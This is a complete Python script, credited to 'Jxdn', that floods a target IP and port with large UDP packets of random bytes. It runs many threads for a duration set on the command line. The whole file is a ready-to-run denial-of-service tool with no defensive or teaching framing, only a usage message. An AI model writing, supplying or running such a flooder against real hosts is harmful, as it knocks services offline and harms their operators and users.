import socket
import sys
import threading
import time
import random

if len(sys.argv) < 5:
    print("UDP-Flood by Jxdn")
    sys.exit("> Usage: python " + sys.argv[0] + " <ip> <port> <threads> <time>")

print("> Code by Jxdn <")
ip = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])
times = float(sys.argv[4])

timeout = time.time() + 1 * times

def udp(ip, port, times):
    timeout = time.time() + 1 * times
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    print(f"Flooding > {ip}:{port} time {times}")
    while time.time() < timeout:
        try:
            data = random._urandom(int(random.randint(19240, 65505)))
            s.sendto(data, (ip, port))
        except:
            s.close()
    print("Flooding > end")

def main():
    global threads
    thread_list = []

    for _ in range(threads):
        th = threading.Thread(target=udp, args=(ip, port, times))
        thread_list.append(th)
        th.start()

    for th in thread_list:
        th.join()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\nBye Bye')
        sys.exit()
